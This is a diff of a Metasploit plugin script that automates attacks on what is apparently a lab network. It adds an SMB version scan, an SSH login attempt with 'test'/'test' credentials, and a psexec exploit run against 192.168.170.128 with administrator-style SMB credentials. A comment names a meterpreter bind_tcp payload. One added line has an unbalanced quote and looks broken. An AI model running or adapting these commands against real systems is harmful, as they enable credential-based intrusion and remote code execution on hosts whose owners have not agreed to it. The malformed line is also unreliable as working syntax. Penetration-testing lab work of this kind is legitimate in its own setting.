@@ -1,6 +1,25 @@
 load db_fun
-db_search hosts
-db_set_run_module "scanner/smb/smb_version" THREADS=2
+db_set_auto
+
+# TODO: add, where service 445 (etc) is open
+db_set_run_module scanner/smb/smb_version=" THREADS=2
+
+db_set_run_module linux auxiliary/scanner/ssh/ssh_login BLANK_PASSWORD=false PASSWORD="test" USERNAME="test" RPORT=22 THREADS=5
+
+db_search_hosts where address=192.168.170.128
+db_set_create newguy
+db_set_run_module newguy exploit/windows/smb/psexec SMBPass="administrator" SMBUser="lab" RPORT=445
+
+
+
+
+
+
+
+
+
+#########################################################################################
+
 
 #		module_name = 'scanner/ssh/ssh_login'
 #		payload_name = 'linux/x86/meterpreter/bind_tcp'
